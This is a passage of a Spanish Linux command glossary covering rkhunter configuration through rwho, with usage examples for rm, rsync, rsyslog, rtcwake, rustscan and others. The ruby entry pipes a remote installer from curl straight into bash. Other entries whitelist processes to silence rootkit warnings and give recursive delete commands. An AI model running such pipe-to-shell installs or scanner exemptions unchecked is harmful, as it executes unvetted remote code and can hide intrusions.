Para evitar falsos "Warnings" del tipo: Warning: The following suspicious (large) shared memory segments have been found, que significa que existen procesos que usan segmentos de memoria compartida y que pueden comprobarse en el archivo de resultados /var/log/rkhunter.log, colocar en el archivo de configuración /etc/rkhunter.conf:
	ALLOWIPCPROC=/usr/bin/firefox
	ALLOWIPCPROC=/usr/lib/chromium/chromium
	ALLOWIPCPROC=/usr/bin/liferea
	ALLOWIPCPROC=/usr/bin/pcmanfm
	...
Nota.- Pueden especificarse varios.
8.-
Puede que algunas utilidades principales que han sido reemplazadas por scripts produzcan falsas advertencias. Estas que pueden silenciarse a través de la lista blanca en /etc/rkhunter.conf:
	SCRIPTWHITELIST=/usr/bin/egrep
	SCRIPTWHITELIST=/usr/bin/fgrep
	SCRIPTWHITELIST=/usr/bin/which
9.-
Para evitar problemas con el --update tipo:
	Checking rkhunter data files...
	Checking file mirrors.dat        [ Skipped ]
	Checking file programs_bad.dat   [ Update failed ]
	Checking file backdoorports.dat  [ Update failed ]
	Checking file suspscan.dat       [ Update failed ]
	Checking file i18n versions      [ Update failed ]
Editar el archivo de configuración /etc/rkhunter.conf y modificar los apartados siguientes de la forma especificada:
	UPDATE_MIRRORS=1
	MIRRORS_MODE=0
Que por defecto son:
	UPDATE_MIRRORS=0
	MIRRORS_MODE=1
Luego la ejecución de:
# rkhunter --update
dará como resultado algo tipo:
	Checking rkhunter data files...
	  Checking file mirrors.dat                                  [ No update ]
	  Checking file programs_bad.dat                             [ No update ]
	  Checking file backdoorports.dat                            [ No update ]
	  Checking file suspscan.dat                                 [ No update ]
	  Checking file i18n/cn                                      [ Skipped ]
	  Checking file i18n/de                                      [ Skipped ]
	  Checking file i18n/en                                      [ No update ]
	  Checking file i18n/tr                                      [ Skipped ]
	  Checking file i18n/tr.utf8                                 [ Skipped ]
	  ...
10.-
Para evitar:
# rkhunter --update
        Update failed
modificar:
# nano /var/lib/rkhunter/db/mirrors.dat
        mirror=https://rkhunter.sourceforge.net
        remote=http://rkhunter.sourceforge.net
11.-
Preferible comentar la linea:
# nano /etc/rkhunter.conf
#WEB_CMD=/bin/false
Modificandola por:
WEB_CMD=wget
12.-
Paquetes opcionales adicionales son: unhide para encontrar procesos y puertos ocultos y skdet (wget http://dvgevers.home.xs4all.nl/skdet/skdet) para verificaciones adicionales de Suckit Rookit.


rkill
[pslist]. Herramienta similar a kill [ver]
$ rkill -9 scribus (Matará la aplicación especificada. Igual que killall [ver])
$ rkill -9 17424 (Matará la aplicación que corra en el PID especificado. Igual que kill)


rl
[randomize-lines]. Muestra lineas de un archivo o de la entrada standard de forma aleatoria.
$ rl /etc/fstab (Forma básica)
$ seq 10 | rl --count 2 (2 números del 0 al 10)
$ rl -n /etc/fstab -o archivo (Numerando las lineas, colocandolas de forma aleatoria y guardando el resultado en "archivo")
$ rl -o archivo -c 5 archivo.txt (Guardar en archivo [-o] 5 lineas [-c] del texto archivo.txt)


rlogin
Conecta con un host remoto
$ rlogin usuario@host


rlwrap
Permite añadir historial y edición de línea (como hace Bash) a programas que normalmente no lo soportan, por ejemplo, clientes de bases de datos, intérpretes propios o cualquier cosa que use la entrada estándar sin readline.
$ rlwrap nc localhost 1234 (Si te conectas con nc [netcat] normalmente no se tiene historial ni autocompletado. Con rlwrap, se pueden usar las flechas ↑↓ para recuperar comandos previos)
$ rlwrap python (se tiene historial de comandos con flechas en un Python viejo sin readline)


rm
Borrar archivos. Puede que con algunas de las opciones tenga que activarse extglob (shopt -s extglob).
$ rm -R directorio         (Borra directorios y los subdirectorios)
$ rm -i   archivo        (Pide confirmación antes de borrar)
$ rm file1 file2  (Borrar varios archivos)
$ rm -R dir1 dir2 dir3 (Lo mismo con varios directorios)
$ rm -f           (Fuerza eliminación incluso si existen ficheros que no existen)
$ find . -type f -empty -exec rm {} \;  (Elimina todos los archivos vacios de un directorio)
$ rm -v !(*.txt)  (Eliminar todos los archivos menos los .txt)
$ rm -v !(*.txt|*.png) (Elimina todos menos los .txt y .png)
$ rm !(tuto+([1-9]) (Borrar los ficheros excepto del tuto1 al tuto9
1.-
Para que todo lo eliminado con el comando rm vaya a la papelera del sistema:
$ nano .bashrc
Y añadimos el alias:
alias rm='mv -t ~/.local/share/Trash/files'
2.-
Eliminar todo un directorio menos un subdirectorio, por ejemplo menos el dir HTMLS:
	$ ls
	dir3  file1.txt  HTMLS  dirpdfs  file2.txt
	$ ls | grep -v HTMLS | xargs -d"\n" rm -rf
	$ ls
	HTMLS


rmdir
Borra directorios vacios
$ rmdir /home/usuario/dir_vacio
$ find . -type d -empty -exec rmdir {} \; (Otra forma)


rmmod
[kmod]. Programa para eliminar un módulo del kernel de Linux.
# rmmod modulo


rng-tools
Daemon para usar un TRNG [True Random Number Generator] de hardware que actúa como puente entre un TRNG, como los de algunos chipsets Intel/AMD/VIA, y el PRNG [Pseudo-Random Number Generator] del kernel. Comprueba los datos recibidos del TRNG mediante las pruebas FIPS 140-2 para verificar su aleatoriedad y los envía al pool de entropía del kernel. Incluye la herramienta rngtest
$ systemctl status rngd
$ cat /dev/random | rngtest -c 1000 (salir después de procesar 1000 bloques)
$ cat /dev/random | rngtest -t 2 (vuelca las estadísticas cada 2 segundos)
$ cat /dev/random | rngtest -b 1000 (vuelca las estadísticas cada 1000 bloques)


robots.txt
Archivo que evita que determinado contenido de un sitio web sea indexado por los motores de búsqueda. Este archivo distingue mayúsculas y minúsculas, puede incluir comentario mediante almohadilla [#] y cada grupo User-agen/Disallow debe de estar separado por una linea en blanco.
Algunos comandos:
User-agent (Indica qué tipo de robot debe cumplir con la directiva que se indica)
	User-agent: * (Incluir todos los buscadores)
	User-agent: Googlebot (Especificar el buscador de Google)
	User-agent: Bingbot (Especificar el robot de Bing)
Disallow  (Niega el acceso a un directorio, un archivo o una página)
	Disallow: (Permite la entrada a todo el sitio)
	Disallow: / (Denegar todo el sitio)
	Disallow: /directorio/ (Denegar un directorio)
	Disallow: /restringido*/ (Denegar directorios que comienzan por "restringido")
	Disallow: /pagina.html (Denegar una página)
	Disallow: /*.png$ (Denegar los archivos que terminen con la extensión .png)
Allow (Permitir el acceso a directorios, archivos o páginas)
	Allow: /directorio/subdirectorio/ (Permitir un subdirectorio)
Sitemap (Indica la ruta a un mapa del sitio en XML)
	Sitemap: http://web.com/sitemap.xml
Crawl-delay (Indica número de segundos que debe esperar para cada acceso a cada página)
	Crawl-delay: 30
Aspecto que puede presentar un archivo robots.txt:
	User-agent: wget
	Disallow: /
	\\ linea en blanco
	User-agent: grub-client
	Disallow: /
	\\ linea en blanco
	User-agent: *
	Disallow:
	\\ linea en blanco
	Sitemap: https://tractatuslapipaplena.herokuapp.com/sitemap.xml


ronn
Construye páginas man. Convierte archivos de texto en markdown a roff para visualización en terminales y también a HTML para la web.
$ man 7 ronn-format (define cada parte del formato de una página man)
$ ronn archivo.md (crea la página de manual archivo y archivo.html)
$ ronn --html --style=dark file.md (crea la versión man en html con fondo negro del md especificado)


root-tail
Programa que muestra y sigue el contenido más reciente de uno o más archivos de registro y utiliza el fondo de escritorio para mostrar las salidas.
$ journalctl -f | root-tail - (canalizar systemd a root-tail)
$ root-tail /var/log/firewalld (uso básico)
$ root-tail -font 10x20 /var/log/postgresql/postgresql-15-main.log,green -font 12x24 /var/log/firewalld,red,'ALERT'


rotatelogs
Programa de rotación de logs de apache en función de un intervalo de tiempo o tamaño máximo del registro. Es un demonio que se ejecuta de forma autónoma.
# logrotate -vf /etc/logrotate.conf (comprobar el correcto funcionamiento de forma manual rotando todos los registros)


rotix
Permite generar ofuscaciones rotacionales.
$ rotix -a -t "linux es un sistema genial"
$ rotix -f archivo.txt -o otro_archivo.txt (ofusca un archivo y lo guarda en otro_archivo.txt)


route
Mostrar/manipular la tabla de enrutamiento ip.
$ route -n
$ route add default gw 192.168.1.50 (Establecer los protocolos de conexión después de levantar una red manualmente con ifconfig)
# route add --host 192.168.0.12 eth0 (agregar un host a una tabla de enrutamiento)
# route add -host IP reject (bloquear una IP)
# route del IP reject (desbloquear una ip)
$ route del -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.10 (Eliminar una puerta de enlace)
$ route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1 (Crear una nueva puerta de enlace)


routef
Refresca las tablas de enrutado [ver routel]
# routef


routel
Componente de ip route para listar las tablas de enrutado. [ver routef]
$ routel


rpcinfo
Para saber los servicios que estan en marcha
$ rpcinfo -p


rpl
Utilidad de búsqueda y reemplazo que cambia cadenas con cadenas nuevas en varios archivos de texto al mismo tiempo.
$ rpl -i -w 'más' 'menos' docs/file_* (Reemplaza todos los "más" sin importar mayúsculas o minúsculas por "menos" en los archivos "file_*" en el directorio docs/)
$ rpl -m -w 'mala cosa' 'excelente caso' docs/file_* (Ignorar mayúsculas y minúsculas al buscar, pero intentar hacer coincidir las mayúsculas y minúsculas del reemplazo)
$ rpl -i -- '-x3' '+x5' docs/file_* (si una de las cadenas comienza con "-", se debe colocar "--" como último argumento ANTES de la cadena)


rpm
Gestor de paqueteria de distros basadas en Red Hat.
# rpm -ivh paquete (instalar un paquete)
# rpm -ivh –nodeeps paquete (instalar paquete rpm ignorando dependencias)
# rpm -e paquete (eliminar paquete)
# rpm -qa (Listar todos los paquetes instalados)
# rpm -qi paquete (información de un paquete)
# rpm -q paquete --whatrequires (listar dependencias de un paquete)
# rpm -qf /etc/httpd/conf/httpd.conf (A qué paquete pertenece un archivo)
# rpm --checksig paquete (verificar integridad de un paquete)
# rpm -qa gpg-pubkey (verificar la integridad de todos los paquetes)


rrdtool
La herramienta de base de datos Round Robin (RRDtool) es un sistema para almacenar y visualizar datos de series temporales (por ejemplo, ancho de banda de red, temperatura de la sala de máquinas, carga promedio del servidor). Almacena los datos en bases de datos Round Robin (RRD), lo que significa que los datos se almacenan en un formato circular: una vez que la base de datos alcanza su tamaño máximo, los datos más antiguos se sobrescriben con los nuevos.
1.-
Para almacenar datos, primero se debe crear una base de datos RRD. Por ejemplo, para monitorear la carga promedio de un servidor:
       # rrdtool create load_average.rrd \
          --start N \
          --step 300 \
          DS:load1:GAUGE:600:0:U \
          DS:load5:GAUGE:600:0:U \
          DS:load15:GAUGE:600:0:U \
          RRA:AVERAGE:0.5:1:288
Las opciones:
    --start N: Inicia la base de datos en el momento actual.
    --step 300: Define un intervalo de 300 segundos [5 minutos] entre actualizaciones.
    DS:load1:GAUGE:600:0:U: Define un Data Source [DS] llamado load1 de tipo GAUGE [valor crudo], con un tiempo de espera de 600 segundos, valor mínimo 0 y máximo desconocido [U].
    RRA:AVERAGE:0.5:1:288: Define un Round Robin Archive [RRA] que almacena el promedio de los valores, con 288 puntos [un día de datos con intervalos de 5 minutos].
# rrdtool update load_average.rrd N:0.15:0.10:0.05 (actualizar la base de datos. N: Indica que se usa la hora actual y 0.15:0.10:0.05: Son los valores para load1, load5 y load15, respectivamente)
2.-
Para crear una gráfica de la carga promedio en las últimas 24 horas:
rrdtool graph load_graph.png \
  --start -86400 \
  --title "Carga promedio del servidor" \
  --vertical-label "Carga" \
  DEF:load1=load_average.rrd:load1:AVERAGE \
  DEF:load5=load_average.rrd:load5:AVERAGE \
  DEF:load15=load_average.rrd:load15:AVERAGE \
  LINE1:load1#FF0000:"Carga 1 min" \
  LINE2:load5#00FF00:"Carga 5 min" \
  LINE3:load15#0000FF:"Carga 15 min"
Las opciones:
    --start -86400: Muestra los datos de las últimas 24 horas (86400 segundos).
    DEF: Define una fuente de datos para graficar.
    LINE1, LINE2, LINE3: Define las líneas en el gráfico con sus respectivos colores y etiquetas.
# rrdtool fetch load_average.rrd AVERAGE --start -86400 (mostrará los valores promedio de los últimos 24 horas)
3.-
Monitoreo de tráfico de red
Crear la base de datos:
# rrdtool create traffic.rrd --start N --step 300 DS:in:COUNTER:600:0:U DS:out:COUNTER:600:0:U RRA:AVERAGE:0.5:1:288
Actualizar la base de datos con datos de tráfico:
# rrdtool update traffic.rrd N:123456:654321
Generar un gráfico:
# graph traffic_graph.png --start -86400 --title "Tráfico de red" --vertical-label "Bytes" DEF:in=traffic.rrd:in:AVERAGE DEF:out=traffic.rrd:out:AVERAGE LINE1:in#FF0000:"Entrada" LINE2:out#00FF00:"Salida"


rrenice
[pslist]. Herramienta con uso igual que renice [ver]


rsnapshot
Script en Perl y basado en rsync que realiza copias de seguridad manualmente o mediante cron [ver].
# cp /etc/rsnapshot.conf.default /etc/rsnapshot.conf (Copiar el archivo de configuración)
# rsnapshot configtest (Comprobar la correctas configuración de la herramienta)
# rsnapshot du (ver el espacio ocupado por las copias de seguridad)
# rsnapshot -V diff daily.0 daily1 (ver las diferencias entre dos copias de seguridad)
# rsnapshot -t hourly (no genera el backup sinó un sumulacro para comprobar que todo funciona)
Ejemplo de archivo de configuración:
# nano /etc/rsnapshot.conf
	snapshot_root   /backup/ # directorio donde se guardan las copias
	cmd_cp		/bin/cp # rutas a los ejecutables
	cmd_rm		/bin/rm
	cmd_rsync	/bin/bin/rsync
	cmd_du		/usr/bin/du
	cmd_rsnapshot_diff		/usr/bin/rsnapshot-diff
	logfile	/var/log/rsnapshot.log # ruta a los logs de la aplicación
	backup /home/ localhost/ # backups de nuestra home y guardados en localhost [/backup/]
	retain hourly 6 (copia cada hora y se almacenan las últimas 6)
	retain daily 7 (copia cada dia y se almacenan las últimas 7)
	retain weekly 4 (cada semana y se almacenan las últimas 4)
	retain monthly 6 (cada mes y se almacenan las últimas 6)
	retain yearly 5 (cada año y se almacenan las últimas 5)


rssh
Shell restrictiva que permite elegir el método de acceso de un usuario que se desea entre las opciones disponibles: scp, sftp, cvs, svn, rsync o rdist. Primero incluir la nueva shell como una shell válida en del sistema:
# echo "/usr/bin/rssh" >> /etc/shells
Crear un usuario con la shell restrictiva:
# useradd -d /home/externo -m extern
# nano /etc/passwd
Y colocar la linea:
	extern:x:1001:1001:extern,,,:/home/externo:/usr/bin/rssh
A continuacion descomentar la o las opciones permitidas:
# nano /etc/rssh.conf
	allowscp
	allowsftp
	allowcvs
	#allowrdist
	allowrsync
	allowsvnserve


rsstail
Mostrar noticias rss en estilo multitail
$ rsstail -n 1 -d -u http://web.com -u http://web1.com -u http://web3.com
Algunas opciones:
-n 1  (Actualizar cada segundo)
-d     (Mostrar descripción)
-z      (Continuar incluso con errores xml)
-l      (Mostrar enlaces)
-u URL (Host del feed)


rsync
Sincronizar archivos o directorios. Trabajar con el directorio montado. En las rutas a copiar, no colocar * si queremos tambien copiar ficheros y directorios ocultos.
$ rsync -av /home/usuario/Dropbox /home/usuario/Copias_seguridad/ (Copiar todo el directorio “Dropbox” en el directorio “Copias_seguridad”)
$ rsync -av --exclude=Dropbox /media/servidor /home/usuario/servidor/ (Sincronizar un servidor con un directorio local excluyendo el dir Dropbox)
Nota.- Pueden excluirse varios directorios [--exclude=Dropbox --exclude=isos --exclcude=public ...]
$ rsync -arvuz Documentos usuario@192.168.1.5:/home/usuario/ (Copiar el directorio en otra máquina)
$ rsync -arvuz -e 'ssh -p 30567' Documentos usuario@192.168.1.5:/home/usuario/ (Copiar el directorio en otra máquina pero especificando otro puerto SSH)
Algunas opciones:
	-a (respaldar recursivamente directorios y subdirectorios)
	-g (conserva el atributo “group” de los archivos originales)
	-E (conserva el atributo “executable” del archivo originales)
	-v (aumentar el nivel de información desplegado)
	-z (comprime los datos que serán transferidos)
	-h (mostrar salida entendible para humanos)
	--exclude=tmp  (Excluir archivos o directorios. /tmp en este caso)
	--delete-during  (Borrar los archivos de origen a medida que son transferidos)
$ rsync -aHxv root@dirección_IP:/ /carpeta_destino --exclude=/dev --exclude=/proc --exclude=/sys --exclude=/tmp (copia/clonación en vivo de todo un sistema remoto a un directorio local. Se recomienda parar todos los servicios en ejecución de la máquina remota y repetir el comando varias veces hasta que no haya ningún fichero copiado, para evitar ficheros corrompidos. Se deben crear las carpetas "/dev", "/proc", "/sys" y "/tmp" en la carpeta de destino).
$ rsync -avz --exclude-from 'rsync_exclude' /home/usuario/ /media/sda11/copa_seguridad (Copia de seguridad del /home/usuario a otra partición excluyendo los archivos especificados en el archivo rsync_exclude)
Nota.- El formato del archivo rsync_exclude para excluir los ficheros ocultos [.*] todos los de la carpeta Dropbox y el video alien de la carpeta Videos será:
	.*
	Dropbox/*
	Videos/alien


rsyslog
Demonio responsable de recopilar mensajes provenientes de las aplicaciones y el kernel y enviarlos a los archivos de registro, almacenados generalmente en el directorio /var/log/. Los mensaje de las aplicaciones están asociadas a unos subsistemas; auth y authpriv [para autentificación], cron [tareas programadas], demon [afecta a algún demonio], ftp [al servidor FTP], kern [proveniente del kernel], lpr [proviene del subsistema de impresión], mail [del subsistema de correo electrónico], news [mensaje del subsistema Usenet], syslog [mensajes del propio servidor syslogd], user [mensajes de usuario genérico], uucp [del servidor UUCP] y local0 a local7 [reservado para uso local] y tambien estan asociados a un nivel de prioridad: emerg [emergencia extrema del sistema], alert [alerta importante], crit [condición critica], err [error], warn [advertencia, posible error], notice [aviso importante], info [mensaje informacivo] y debug [mensaje de depuración]
Modificar el archivo:
# nano /etc/rsyslog.conf
Desconmentando las lineas:
  module(load="imudp")
  input(type="imudp" port="514")
  module(load="imtcp")
  input(type="imtcp" port="514")
Que todos los mensajes de alerta se manden a los usuarios “root” y “USER”
  *.alert      root,USER
Comprobar si el archivo de configuración está correcto:
# rsyslogd -N1 -f /etc/rsyslog.conf
Para que los cambios surtan efecto reiniciar el servicio:
# systemctl restart rsyslog
Verificar que el servicio rsyslog esté escuchando en los puertos especificados.
# ss -tunlp | grep 514# rsyslogd -dn (modo debug)
# rsyslogd -n (de forma interactiva)
# rsyslogd -dn (modo debug)


rtacct
Monitorear los contadores snmp del kernel y las estadísticas de la interfaz de red cuyo contenido se encuentra en /proc/net/rt_acct.
# rtacct -a -s -z (volcar valores absolutos, no actualizar el historial y mostrar tambien los contadores a cero)
# rtacct -n (solo actualizar el historial)
# rtacct -d 5 (ejecutar en modo daemon y recolectando las estadisticas cada 5 segundos)


rtc
[Real Time Clock]. Dispositivo que se encarga de mantener la hora y fecha del sistema actualizados incluso cuando este está apagado. Para comprobar si el pc tiene RTC:
# grep -i rtc /boot/config-6.1.0-13-amd64 (substituir por el kernel real instalado lanzando el comando: uname -r)
...
CONFIG_RTC_HCTOSYS_DEVICE="rtc0"
...
# cat /sys/class/rtc/rtc0/wakealarm (verificar si hay algún arranque configurado. Si no devuelve ningún valor significa que no se ha configurado ningún arranque)
Para probar si el arranque programado funciona, primero se restablece el arranque a cero y luego se establece que arranque el pc en 3 minutos al cerrar:
# echo 0 > /sys/class/rtc/rtc0/wakealarm
# echo `date '+%s' -d '+ 3 minutes'` > /sys/class/rtc/rtc0/wakealarm
Si ahora volvemos a lanzar:
# /sys/class/rtc/rtc0/wakealarm
Nos da un número parecido a 1699298144 que son la cantidad de segundos transcurridos desde la medianoche UTC del 1 de enero de 1970 [inicio de la época unix] hasta el momento que se lanza el comando. A los 3 minutos de cerrar el pc ha de reiniciarse. Más información sobre el driver rtc:
$ cat /proc/driver/rtc


rtcwake
Entrar en un estado de suspensión del sistema hasta la hora de activación especificada.
# rtcwake -m show -v (Mostar si una suspensión o arranque está activo o no)
# rtcwake -m mem -s 10 (suspender la RAM y reiciciar en 10 segundos)
# rtcwake -m no -l -t `date +%s -d 'today 18:30:00'` ([-m no] no suspender, [-l] hardware configurado en hora local y [-t] hora de arrancar, hoy a las 6,30 de la tarde)
# rtcwake -m disk -u -s 60 (-u asume que el reloj del hardware está configurado en UTC, [-m disk] suspende en disco y -s lo reactiva un minuto después [en segundos])
# rtcwake --list-modes
Los modos son los siguientes:
    freeze (Procesos congelados, dispositivos suspendidos y procesadores inactivos. Ahorra menos energía porque el sistema está ejecución)
    mem (Suspensión a RAM. Ahorra energía ya que el sistema se pone en un estado de bajo consumo, excepto la memoria para conservar su contenido.
    disk (Suspensión en disco. Mayor ahorro de energía. Similar a suspender en RAM, pero incluye escribir el contenido de la memoria en el disco)
    off (Poweroff. Esto se hace llamando a /sbin/shutdown. No cuenta con el apoyo oficial de ACPI, pero normalmente funciona)
    no (No suspender, solo configurar la hora de activación RTC)
    on (No suspender, pero lee el dispositivo RTC hasta que aparezca la hora de activación)
    disable (Desactiva una activación previamente configurada)
    show (Imprima la información de la alarma en formato: "alarm: off|on <time>". Por ejemplo, "alarm: on Tue Nov 16 04:48:45 2010")
Nota.- La opción -a lee de forma automática la configuración del reloj del hardware esté configurado en UTC [-u] o en hora local [-l]. Este es el valor predeterminado.
# rtcwake -m mem -s 120 && firefox (suspende el pc a RAM, la activa dos minutos más tarde y luego inicia Firefox)
# rtcwake -m disk --date +15min (Suspender en disco y reactivarse 15 minutos después)
# rtcwake -m freeze --date 202311051230 (Congele el sistema y recupérelo en una fecha y hora determinadas [2023/11/05 12:30])
# rtcwake -m disable (Desactivar una alarma previamente configurada)
# rtcwake -m on --date 20:30 (Realizar ensayo para reactivar la computadora en un momento determinado. Cancelar con Ctrl+c)
La marca de tiempo puede ser cualquiera de las siguientes:
   AAAAMMDDhhmmss
   AAAA-MM-DD hh:mm:ss
   AAAA-MM-DD hh:mm (los segundos se establecerán en 00)
   AAAA-MM-DD (la hora se establecerá en 00:00:00)
   hh:mm:ss (la fecha será hoy)
   hh:mm (la fecha se establecerá en hoy, los segundos en 00)
   tomorrow (la hora está establecida en 00:00:00)
   +5min


rtkitctl
[realtimekit]. Servicio del sistema D-Bus que cambia la política de programación de los hilos y procesos de usuario a modo de programación en tiempo real, a petición del usuario. Está concebido para ser utilizado como un mecanismo seguro que permita la programación en tiempo real para ser utilizado por los procesos normales.
# rtkitctl --reset-known (restablecer el estado en tiempo real de los hilos conocidos)
# rtkitctl --reset-all (restablecer el estado en tiempo real de todos los hilos)
# rtkitctl --start (iniciar rtkitctl si aún no se está ejecutando)
# rtkitcrl --exit (finalizar la ejecución del demonio RealtimeKit)


rtl-sdr
Receptor de radio analógica o digital definido por software para Realtek RTL2832U. Es un software receptor de radio definido por software [SDR] para ciertos adaptadores USB DVB-T/DAB en el chip Realtek RTL2832U. Consta de las siguientes aplicaciones: rtl_adsb [Decodificación de ADS-B [Air Data Service Broadcast]], rtl_biast [Control de temperatura del biaseador], rtl_eeprom [Leer/escritura EEPROM del chip RTL2832U], rtl_fm, rtl_power, rtl_sdr, rtl_tcp y rtl_test.
$ rtl-sdr -l (verificar si el dispositivo está conectado)
$ rtl_fm -f 107.1M -g 50 -s 48000 -r 24000 - | ffmpeg -i ppe:0 -acodec mp3 -b:a 192k output.mp3 (captura una estación de radio FM en 107.1 MHz y graba el audio en formato MP3)
$ rtl_power -f 24M:1700M:200kHz -g 40 -i 60 -e 3600 -v ag (mide la potencia de señales en el rango de frecuencia especificado durante 6 minutos)
$ rtl_tcp -p 1234 (que el dispositivo emita señal TCP en el puerto 1234)
$ rtl_test -t (realiza pruebas básicas del hardware RTL2832U)


rtla
Comando para analizar las propiedades en tiempo real del sistema. rtla utiliza capacidades de seguimiento del kernel para proporcionar información precisa sobre las propiedades y las causas fundamentales de resultados inesperados.
# rtla osnoise (información sobre el ruido del sistema operativo)
# rtla timerlat (Mide la IRQ y la latencia del temporizador de subprocesos)


rtmon
Permite guardar/monitorizar la tabla de rutas.
# rtmon file /var/log/rtmon.log (guardar en un fichero)
Dado que el fichero estará en formato binario ha de visualizarse con:
# ip monitor file /var/log/rtmon.log


rtorrent
Descarga de archivos a partir de torrents
$ rtorrent url.torrent


rt-tests
Contiene un conjunto de programas que prueban y miden varios componentes del comportamiento del kernel en tiempo real, como la latencia del temporizador, la latencia de la señal, etc. Incluye las aplicaciones: cyclicdeadline [prueba el programador de fechas límite usando un programa estilo prueba cíclica], cyclictest [detección de latencia], deadline_test [prueba el programador de fechas límite], determine_maximum_mpps [determina los mpps máximos que la máquina puede manejar], hackbench [prueba de estrés/comparación del programador], oslat [medidas de retraso con RDTSC], pi_stress [herencia prioritaria con procesos], pip_stress [prueba de estrés para mutex de herencia de prioridad POSIX], pmqtest [ inicia pares de subprocesos y mide la latencia de la comunicación entre procesos con colas de mensajes POSIX], ptsematest [inicia dos subprocesos y mide la latencia de la comunicación entre procesos con POSIX mutex.], queuelat [programa de prueba de latencia de cola], rt-migrate-test [programa de migración de tareas en tiempo real], signaltest [software de prueba de ida y vuelta de señal], sigwaittest [inicia dos subprocesos o bifurca dos procesos y mide la latencia entre el envío y la recepción de una señal], ssdd [un rastreador que hace un montón de PTRACE_SINGLESTEP] y svsematest [inicia dos subprocesos o bifurca dos procesos y mide la latencia de los semáforos SYSV]


ruby
Lenguaje de programación orientado a objetos. Ver irb.
Instalación:
	$ curl -L https://get.rvm.io | bash -s stable --ruby
	$ source ~/.rvm/scripts/rvm
	$ rvm install 1.9.3
	$ rvm --default ruby-1.9.3
Y comprobar o añadir:
$ nano .bashrc
La linea:
	 [[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"
$ ruby script.rb (ejecutar un script de ruby)
$ ruby -e "puts Dir.glob('*').count" (la opción -e permite introducir directamente código en la linea de comando. Mostrar la cantidad de archivos del presente directorio en este caso)
$ ruby -v (Versión de ruby)


runit
Colección de herramientas para proporcionar supervisión y gestión de servicios en el sistema: iniciar y detener servicios y supervisar los daemons mientras se ejecutan, enviar señales a daemons de servicio sin la necesidad de archivos pid, registro con rotación automática de archivos de registro y límites de espacio en disco. Consta de las siguientes aplicaciones: chpst [ver], cpsv, runsv [se ejecuta dentro de un directorio de servicio, donde controlará y mantendrá el servicio en ejecución. runsv se ocupa de iniciar, detener, reiniciar el servicio y también de monitorizar su estado], runsvdir [se encarga de supervisar varios servicios a la vez], sv [ver], svlogd, mk-runscript, runsvchdir, update-service, utmpset.
$ svlogd /home/USER/Documentos/ (daemon que activa la monitorización del directorio especificado)
# runsv /etc/service/nginx (si el proceso de nginx se detiene, runsv lo volverá a iniciar automáticamente)
# runsvdir /etc/service/ (todos los servicios del directorio serán supervisados automáticamente)
# update-service --add nginx (creará un enlace simbólico en /etc/service/mi_servicio, lo que hará que runit comience a gestionarlo)
# update-service --delete nginx (eliminará el enlace simbólico y runit dejará de gestionar ese servicio)
# update-service --list (servicios que están habilitados y gestionados por runit)
# utmpset add USER tty7 (añade una entrada para USER en el terminal tty7)
# utmpset delete USER tty7 (eliminar la entrada anterior)
# utmpset check (verificar si hay entradas duplicadas o inconsistentes en utmp)
# svlogd /var/log/un_servicio (que los logs se guarden en determinado directorio)
# svlogd -tt -b 10000000 -l 5 /var/log/un_servicio (rotación de logs con un límite de tamaño de 10 MB y que guarde hasta 5 archivos de logs antiguos)


runlevel
conocer el nivel de ejecución actual del sistema [gráfico, monousuario...]
$ runlevel


runlim
Herramienta que ejecuta un programa especificado y cuando se cierra, muestra en pantalla o guarda en un archivo el tiempo y el uso de la memoria y la de sus hijos basados en el sistema de archivos proc.
$ runlim -o archivo chromium (guarda los datos en "archivo")


run-parts
[debianutils]. Ejecuta todos los ejecutables que se encuentran en el directorio especificado.
$ run-parts --list --regex '.*sh$' scripts (lista todos los .sh del directorio "scripts")
$ run-parts --test --regex '^p.*sh$' scripts (lista los que se ejecutacian del directorio "scripts", que empiecen por "p" y terminen con "sh" pero no los ejecuta realmente)
$ run-parts --reverse scritps (los ejecuta en orden inverso)
$ run-parts --exit-on-error scripts (salir cuando muestre un código de salida distinto de cero)


ruplacer
Reemplazar texto en archivos o directorios.
$ ruplacer 'texto a reemplazar' 'texto de reemplazo' archivo
$ ruplacer --subvert 'texto a reemplazar' 'texto de reemplazo' directorio (en todos los archivos del directorio y dar la opción de si con mayúscula o minúscula)
$ ruplacer --no-regex 'texto viejo' 'texto nuevo' (sustitución literal)


ruptime
Muestra el estado de cada host en una red. El comando ruptime proporciona una línea de estado como tiempo de actividad para cada máquina en la red local; Estos se forman a partir de paquetes emitidos por cada host en la red una vez por minuto.
# ruptime -l (ordena la lista por el promedio de carga)
# ruptime -a (incluye a todos los usuarios. Sin esta opción, los usuarios cuyas sesiones estén inactivas una hora o más no están incluidos)
# ruptime -t (ordena por el tiempo de actividad)
# ruptime -u (ordena la lista por el número de usuarios)


rusers
Produce una salida similar a who [ver], pero para la lista de hosts o todas las máquinas de la red local. Para cada host que responde a la consulta, se imprime el nombre del host con los nombres de los usuarios actualmente conectados. El comando rusers esperará un minuto para atrapar a los que responden tarde.
# rusers (muestra unna lista de los usuarios de la red registrados en máquinas remotas)
# rusers -h (lista usuarios ordenados alfabéticamente por nombre de host)
# rusers -h oficina (produce una lista de usuarios en el host oficina)
# rusers -u (genera lista de usuarios conectados a máquinas remotas y ordenados por el número de usuarios conectados)
# rusers -i (genera lista de usuarios registrados en máquinas remotas y ordenados de acuerdo con el tiempo de inactividad de cada máquina)


rustscan
Escáner de puertos.
$ rustscan -a 127.0.0.1,0.0.0.0 (escanear varias IP utilizando una lista separada por comas)
$ rustscan -a www.google.com, 127.0.0.1 (escanear hosts)
$ rustscan -a 127.0.0.1 -p 53 (escaneo de puertos individuales)
$ rustscan -a 127.0.0.1 (todos los puertos del host)


rvm
Paquete de gestión para entornos ruby y las gemas de cada proycto.
$ rvm install 1.9.2 (Instalar una versión de ruby)
$ rvm requirements (Instalar dependencias)
$ rvm upgrade 1.8.7 ruby-1.8.7-p299 (Actualizar de la versión de ruby 1.8.7-p299 a la siguiente)
$ rvm --default ruby-1.9.2 (Establecer la versión de ruby por defecto)
$ rvm gemset list (Lista gemsets [ver] creados, mostrando el que está por defecto y versión)
$ rvm gemset create NOMBRE_GEMSET (Crear un gemset)
$ rvm gemset use NOMBRE_GEMSET (Utilizar un gemset)
$ rvm gemset use VERSION@NOMBRE_GEMSET (Especificar versión de ruby y el gemset a cambiar)


rwho
